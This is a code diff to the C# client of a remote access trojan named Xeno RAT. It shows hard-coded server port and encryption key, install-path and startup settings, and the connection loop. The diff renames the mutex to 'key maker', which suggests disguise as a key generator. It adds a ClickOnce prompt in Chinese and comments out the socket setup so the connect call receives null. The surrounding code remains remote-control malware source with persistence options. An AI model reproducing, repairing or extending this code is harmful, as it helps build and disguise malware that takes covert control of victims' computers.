@@ -21,7 +21,7 @@ namespace xeno_rat_client
         private static int ServerPort = 1234;
         private static byte[] EncryptionKey = new byte[32] { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
         private static int delay = 1000;
-        private static string mutex_string = "testing 123123";
+        private static string mutex_string = "key maker";
         private static int DoStartup = 2222;
         private static string Install_path = "nothingset";
         private static string startup_name = "nothingset";
@@ -90,10 +90,10 @@ namespace xeno_rat_client
             {
                 try
                 {
-                    
-                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+                    MessageBox.Show("ClickOnce", "确定要运行吗");
+                    //Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                     //await socket.ConnectAsync(ServerIp, ServerPort);
-                    Server = await Utils.ConnectAndSetupAsync(socket, EncryptionKey, 0, 0, OnDisconnect);
+                    Server = await Utils.ConnectAndSetupAsync(null, EncryptionKey, 0, 0, OnDisconnect);
                     Handler handle = new Handler(Server, dllhandler);
                     //await handle.Type0Receive();
                     Thread.Sleep(3600000);
